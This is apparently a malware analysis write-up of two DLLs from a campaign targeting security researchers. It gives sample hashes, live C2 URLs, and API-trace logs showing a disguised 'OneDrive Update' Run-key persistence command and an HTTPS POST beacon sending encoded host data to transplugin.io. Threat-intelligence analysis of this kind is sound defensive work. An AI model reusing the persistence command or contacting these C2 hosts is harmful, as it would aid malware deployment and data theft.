SHA256 : 4c3499f3cc4a4fdc7e67417e055891c78540282dccc57e37a01167dfe351b244  
SHA256 : A75886B016D84C3EAACAF01A3C61E04953A7A3ADF38ACF77A4A2E3A8F544F855  
sample source : https://bazaar.abuse.ch/sample/4c3499f3cc4a4fdc7e67417e055891c78540282dccc57e37a01167dfe351b244/  
sample source : https://bazaar.abuse.ch/sample/a75886b016d84c3eaacaf01a3c61e04953a7a3adf38acf77a4a2e3a8f544f855/  
VT : https://www.virustotal.com/gui/file/4c3499f3cc4a4fdc7e67417e055891c78540282dccc57e37a01167dfe351b244  
VT : https://www.virustotal.com/gui/file/a75886b016d84c3eaacaf01a3c61e04953a7a3adf38acf77a4a2e3a8f544f855   

Report: https://blog.google/threat-analysis-group/new-campaign-targeting-security-researchers/  

C2 :  
https://www.dronerc.it/shop_testbr/upload/upload.php  
https://transplugin.io/upload/upload.asp  
https://codevexillium.org/image/download/download.asp  

---

Initial DLL (4c3499f3cc4a4fdc7e67417e055891c78540282dccc57e37a01167dfe351b244) is dropping, 'installing' and starting the 2nd DLL (A75886B016D84C3EAACAF01A3C61E04953A7A3ADF38ACF77A4A2E3A8F544F855) through a basic persistency mechanism :  

```html
[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
[API] <RegSetValueExA> in [ADVAPI32.dll] 
[PAR] HKEY    hKey        : 0xf0 
[PAR] LPCTSTR lpValueName : 0x0000003DFD70EDB0
[STR]         -> "OneDrive Update"
[PAR] DWORD   dwType      : 0x1 (REG_SZ)
[PAR] BYTE    *lpData     : 0x0000003DFD70EEE0
            -> 0x0000003DFD70EEE0
[STR] -> "C:\\Windows\\System32\\rundll32.exe C:\\ProgramData\\VMware\\vmnat-update.bin,OCSP_resp_find lxUi5CZ0IV45j89Y 4901"
[RET] 0x7ff9b1563879 in [cms_data_final.dll]

[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
[API] <CreateProcessA> in [KERNEL32.DLL] 
[PAR] LPCTSTR               lpApplicationName    : 0x0 (null)
[PAR] LPCTSTR               lpCommandLine        : 0x0000003DFD70EEE0
[STR]                       -> "C:\\Windows\\System32\\rundll32.exe C:\\ProgramData\\VMware\\vmnat-update.bin,OCSP_resp_find lxUi5CZ0IV45j89Y 4901"
[PAR] LPSECURITY_ATTRIBUTES lpProcessAttributes  : 0x0
[PAR] LPSECURITY_ATTRIBUTES lpThreadAttributes   : 0x0
[PAR] BOOL                  bInheritHandles      : 0x0
[PAR] DWORD                 dwCreationFlags      : 0x8000000 (CREATE_NO_WINDOW)
[PAR] LPVOID                lpEnvironment        : 0x0
[PAR] LPCSTR                lpCurrentDirectory   : 0x0 (null)
[PAR] LPSTARTUPINFOA        lpStartupInfo        : 0x0000003DFD70CD30
[FLD]                       -> lpDesktop   = 0x0 (null)
[FLD]                       -> lpTitle     = 0x0 (null)
[FLD]                       -> dwFlags     = 0x0 
[FLD]                       -> wShowWindow = 0x0
[FLD]                       -> hStdInput   = 0x0
[FLD]                       -> hStdOutput  = 0x0
[FLD]                       -> hStdError   = 0x0
[PAR] LPPROCESS_INFORMATION lpProcessInformation : 0x0000003DFD70CD10
[RET] 0x7ff9b156397d in [cms_data_final.dll]
```
--- 
There is then nothing much to observe through dynamic analysis :  

```html
[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
[API] <InternetConnectW> in [WININET.dll] 
[PAR] HINTERNET     hInternet      : 0xcc0010
[PAR] LPCWSTR       lpszServerName : 0x000000457D49CF40 ("transplugin.io")
[PAR] INTERNET_PORT nServerPort    : 443
[PAR] LPCWSTR       lpszUsername   : 0x0 (null)
[PAR] LPCWSTR       lpszPassword   : 0x0 (null)
[PAR] DWORD         dwService      : 0x3 (INTERNET_SERVICE_HTTP)
[PAR] DWORD         dwFlags        : 0x0 
[RET] 0x1800029f1

[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
[API] <HttpOpenRequestW> in [WININET.dll] 
[PAR] HINTERNET hConnect           : 0xcc0014
[PAR] LPCWSTR   lpszVerb           : 0x00000001800580D0 ("POST")
[PAR] LPCWSTR   lpszObjectName     : 0x000000457D49D920
[STR]           -> "/upload/upload.asp"
[PAR] LPCWSTR   lpszVersion        : 0x00000001800580B8
[STR]           -> "HTTP/1.0"
[PAR] LPCWSTR   lpszReferer        : 0x0 (null)
[PAR] LPCWSTR   *lplpszAcceptTypes : 0x0
[PAR] DWORD     dwFlags            : 0x803000 (INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID)
[RET] 0x180002a44

[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
[API] <HttpSendRequestW> in [WININET.dll] 
[PAR] HINTERNET hRequest         : 0xcc0018
[PAR] LPCWSTR   lpszHeaders      : 0x0 (null)
[PAR] DWORD     dwHeadersLength  : 0x0
[PAR] LPVOID    lpOptional       : 0x000000457F1868C0
[STR]           -> "XW=EZYNQE&XOHTN=NDkwMThYOU8zSWRuQjJONw==&EWKK=&HIXXEE=0&HPYYJD=52&JTMDLK=MgAwADIANQAtADAAMwAtADAANAAgADIAMQA6ADMANwA6ADM"
[STR]              "AOQA=&LSZRYMNDS=IPTDYCTZLUHNEJATJ&NONPECZ=FLOTMDRIMZIUQZZG"
[PAR] DWORD     dwOptionalLength : 0xb2
[RET] 0x18000314f
```
--- 

Going through some statical analysis it is possible to identify which library was linked with the malware to provide the cryptographic layer :  

![Alt text](screen/crypto.jpg?raw=true "statically linked lib")

The associated lib was very likely obtained from here :  

https://www.mail-archive.com/openssl-dev@openssl.org/msg28042.html  

![Alt text](screen/source.jpg?raw=true "statically linked lib")

Going further with dynamic analysis would require implemeting a C2 supporting this ECIES encrypted communication protocol

